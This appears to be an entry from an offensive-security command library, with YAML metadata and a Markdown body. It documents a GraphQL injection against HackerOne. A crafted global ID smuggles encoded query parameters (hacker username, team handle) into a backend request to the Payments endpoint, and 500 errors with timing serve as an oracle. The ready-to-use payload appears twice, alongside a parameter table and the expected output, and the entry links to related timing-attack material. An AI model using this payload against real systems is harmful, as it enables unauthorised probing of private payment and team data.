---
data: >-
  query { node(id:
  "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26")
  { ... on User { id } } }
tags:
  - injection
  - graphql
type: command
output: >-
  HTTP GET
  /payments/?core_hacker_username=jobert&core_team_handle=security%26.json; 500
  error with timing based on matches
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.604Z'
id: 44364e22-545b-4531-81ce-29a76b6a7191
verified: false
validated: true
submitted: true
---
# inject-query-parameters

## Command

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26") { ... on User { id } } }
```

## Description

Injects encoded query parameters to filter the Payments index endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Encoded ID with %3f and %26 | Yes |
| core_hacker_username | Username filter | Yes |
| core_team_handle | Team handle filter | Yes |

## Examples

### Basic Usage

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26") { ... on User { id } } }
```

## Expected Output

Backend GET with injected params; 500 if mismatch.

## Related

- [[commands/perform-timing-attack]]
- [[procedures/Inject-Query-Parameters-via-Global-ID]]
